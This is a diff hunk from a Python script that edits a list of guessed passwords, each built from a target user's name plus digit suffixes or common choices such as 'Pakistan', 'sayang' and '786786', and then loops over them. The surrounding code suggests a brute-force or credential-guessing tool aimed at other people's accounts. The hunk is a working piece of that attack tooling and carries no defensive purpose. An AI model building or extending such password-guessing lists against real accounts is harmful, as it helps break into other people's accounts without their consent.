@@ -241,16 +241,18 @@ if __name__ == '__main__':
                                 ss = users[0].split(' ')
                                 for x in ss:
                                         listpass = [
-                                                str(x) + '123',
-                                                str(x) + '12345',
-                                                str(x) + '123456',
-                                                str(x) + '12',
-                                                str(x) + '124',
-                                                'Pakistan',
+						'Pakistan',
+						'pakistan',
                                                 '123456789',
 						'sayang',
                                                 '786786',
 						'123456',
+                                                str(x) + '123',
+						str(x) + '1234',
+						str(x) + '124',
+                                                str(x) + '12345',
+                                                str(x) + '123456',
+                                                str(x) + '12'
                                                 ]
                                         listpass.append(expass)
                                         for passw in set(listpass):
